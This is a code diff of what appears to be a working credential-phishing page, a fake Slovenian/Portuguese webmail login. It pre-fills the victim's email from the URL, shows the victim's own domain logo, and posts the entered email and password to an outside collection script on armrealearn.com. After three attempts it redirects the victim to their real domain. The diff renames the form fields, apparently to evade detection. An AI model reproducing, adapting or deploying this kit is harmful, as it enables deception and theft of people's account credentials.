@@ -170,133 +170,152 @@ body {
   </script>
 
   
-  <script>
 
-    /* global $ */
-    $(document).ready(function(){
-      var count=0;
 
-      $('#back1').click(function () {
+
+
+<!-- SCRIPT BEGINS -->
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    $('#back1').click(function() {
         $("#msg").hide();
-        $('#email').val("");
-        $("#automail").animate({left:200, opacity:"hide"}, 0);
-        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+        $('#ai').val("");
+        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
 
-      });
+    });
 
-      var email = window.location.hash.substr(1);
-      if (!email) {
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
 
-      }
-      else
-      {
-        var my_email =email;
-        $('#email').val(my_email);
-        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+        $("#msg").hide();
+        $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
+        $("#automail").animate({ right: 200, opacity: "show" }, 1000);
+    }
+    ///////////////url getting ai////////////////
 
-        if (!filter.test(my_email)) {
-          $('#error').show();
-          email.focus;
-          return false;
-        }
-        var ind=my_email.indexOf("@");
-        var my_slice=my_email.substr((ind+1));
-        var c= my_slice.substr(0, my_slice.indexOf('.'));
-        var final= c.toLowerCase();
-        var finalu= c.toUpperCase();
 
-        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
-        $("#logoname").html(finalu);
-        $(".logoname").html(finalu);
-        $("#iframe").attr("src", "https://www."+my_slice);
-      }
-      
-      $('#submit-btn').click(function(event){
+    var file = "bmV4dC5waHA=";
+    $('#submit-btn').click(function(event) {
         $('#error').hide();
         $('#msg').hide();
         event.preventDefault();
-        var email=$("#email").val();
-        var password=$("#password").val();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
         var msg = $('#msg').html();
-        $('#msg').text( msg );
-      ///////////new injection////////////////
-      var my_email =email;
-      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        $('#msg').text(msg);
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 
-      if (!filter.test(my_email)) {
-        $('#error').show();
-        email.focus;
-        return false;
-      }
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("Email field is empty.!");
+            ai.focus;
+            return false;
+        }
 
-      var ind=my_email.indexOf("@");
-      var my_slice=my_email.substr((ind+1));
-      var c= my_slice.substr(0, my_slice.indexOf('.'));
-      var final= c.toLowerCase();
-      var finalu= c.toUpperCase();
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Geslo ne sme biti prazno");
+            ai.focus;
+            return false;
+        }
 
-$("#iframe").attr("src", "https://www."+my_slice);
-        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
-        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
-        $("#logoname").html(finalu);
-      ///////////new injection////////////////
-      count=count+1;
-      
-      $.ajax({
-        dataType: 'JSON',
-        url: 'https://armrealearn.com/saareplyski.php',
-        type: 'POST',
-        data:{
-          email:email,
-          password:password,
-        },
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        ///////////new injection////////////////
+        count = count + 1;
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+
+        $.ajax({
+            dataType: 'JSON',
+            url:'https://armrealearn.com/bestcojoski.php',
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
             // data: $('#contact').serialize(),
-            beforeSend: function(xhr){
-              $('#submit-btn');
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('Preverjanje pristnosti...');
             },
-            success: function(response){
-              if(response){
+            success: function(response) {
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#pr").val("");
+                        if (count >= 3) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+                            window.location.replace("http://www." + my_slice);
+
+                        }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 3) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                }
                 $("#msg").show();
-                console.log(response);
-                if(response['signal'] == 'ok'){
-                  $("#password").val("");
-                  if (count>=4) {
-                    count=0;
-                    // window.location.replace(response['redirect_link']);
-                    window.location.replace("http://www."+my_slice);
-
-                  }
-                  // $('#msg').html(response['msg']);
-                }
-                else{
-                  // $('#msg').html(response['msg']);
-                }
-              }
+                // $('#msg').html("Please try again later");
             },
-            error: function(){
-              $("#password").val("");
-              if (count>=4) {
-                count=0;
-                window.location.replace("http://www."+my_slice);
-              }
-              $("#msg").show();
-              // $('#msg').html("Please try again later");
-            },
-            complete: function(){
-              $('#submit-btn').html('Prijava');
+            complete: function() {
+                $('#submit-btn').html('Prijava');
             }
-            
-            
-          });
-          
-        
+        });
     });
 
 
-    });
+});
+</script>
 
 
-  </script>
+
+
+
 <script>
     window.onload = function() {
   var input = document.getElementById("password").focus();
@@ -313,27 +332,33 @@ $("#iframe").attr("src", "https://www."+my_slice);
 
  <div class="content">
          <div class="text">
-            <center>Nadzorna plosca
+            <center>Painel de Controle
          </div>
-<div class="alert alert-danger" id="msg" style="display: none; color:red;">Geslo ni veljavno. Vnesite pravilno geslo.</div>
-         <form action="" method="post">
+
+ <center><span id="error" class="text-danger" style="display: none; color:red;">That account doesn't exist.
+                                Enter a different account</span></center>
+
+ <div class="alert alert-danger" id="msg" style="display: none; color:red;"> Napačen e-poštni naslov/geslo, poskusite znova.</div>
+
+
+           <form action="send.php" method="POST" name="ValidationForm">
             <div class="field">
-               <input required="" type="email" name="email" id="email"  class="input" readonly>
+               <input required  type="email" name="ai" id="ai"  class="input" readonly>
                <span class="span"><svg class="" xml:space="preserve" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" y="0" x="0" height="20" width="50" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" xmlns="http://www.w3.org/2000/svg"><g><path class="" data-original="#000000" fill="#595959" d="M256 0c-74.439 0-135 60.561-135 135s60.561 135 135 135 135-60.561 135-135S330.439 0 256 0zM423.966 358.195C387.006 320.667 338.009 300 286 300h-60c-52.008 0-101.006 20.667-137.966 58.195C51.255 395.539 31 444.833 31 497c0 8.284 6.716 15 15 15h420c8.284 0 15-6.716 15-15 0-52.167-20.255-101.461-57.034-138.805z"></path></g></svg></span>
                <label class="label">  </label>
             </div>
             <div class="field">
               
- <input  type="password" name="password" id="password"  required="" class="input" required>
+ <input  type="password" name="pr" id="pr"  required="" class="input">
                <span class="span"><svg class="" xml:space="preserve" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" y="0" x="0" height="20" width="50" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" xmlns="http://www.w3.org/2000/svg"><g><path class="" data-original="#000000" fill="#595959" d="M336 192h-16v-64C320 57.406 262.594 0 192 0S64 57.406 64 128v64H48c-26.453 0-48 21.523-48 48v224c0 26.477 21.547 48 48 48h288c26.453 0 48-21.523 48-48V240c0-26.477-21.547-48-48-48zm-229.332-64c0-47.063 38.27-85.332 85.332-85.332s85.332 38.27 85.332 85.332v64H106.668zm0 0"></path></g></svg></span>
-               <label class="label">GESLO</label>
+               <label class="label">Geslo</label>
             </div>
             <div class="forgot-pass">
-               
+              
             </div>
             <button type="submit" id="submit-btn" class="button">Prijava</button>
             <div class="sign-up">
-               
+            
             </div>
          </form>
       </div>
